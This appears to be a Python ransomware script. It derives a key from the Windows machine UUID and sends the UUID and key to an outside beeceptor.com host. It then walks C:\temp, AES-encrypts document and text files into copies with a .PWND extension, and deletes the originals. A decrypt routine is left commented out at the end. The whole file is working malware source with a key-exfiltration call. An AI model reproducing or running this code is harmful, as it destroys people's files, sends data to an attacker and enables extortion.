import subprocess, requests, os
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

def encrypt(raw, password):
    BLOCK_SIZE = 16
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    raw = pad(raw)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(raw))


def encPwd():
    dictionary = {'a':1,'b':2,'c':3,'d':4,'e':5,'f':6,'g':7,'h':8,'i':9,'j':10,'k':11,'l':12,'m':13,'n':14,'o':15,'p':16,'q':17,'r':18,'s':19,'t':20,'u':21,'v':22,'w':23,'x':24,'y':25,'z':26}
    currentMachineId = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(" ")[0].lower())
    key = currentMachineId.replace("-","")
    for letter in dictionary:
        key = key.replace(letter,str(dictionary[letter]))
    requests.get('https://randsome.free.beeceptor.com/' + currentMachineId + "&" + key)   
    return key

encPwd = encPwd()
extList = ["txt", "docx", "xslx", "doc", "xsl", "pdf"]

### Encrypt maggle

for (dirpath, dirnames, filenames) in os.walk('C:\\temp'):
    branch = dirpath
    for file in filenames:
        fullname = branch + "\\" + file
        if (fullname.split('.')[-1] in extList):
            with open(fullname, 'r') as content_file:
                content = content_file.read()

            encContent = encrypt(content, encPwd)

            with open(fullname + '.PWND','w') as enc_file:
                enc_file.write(encContent)

            os.remove(fullname)

"""  DECRYPT FUNCTION

def decrypt(enc, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[16:]))

bytes.decode(decrypt(encrypted, password))

"""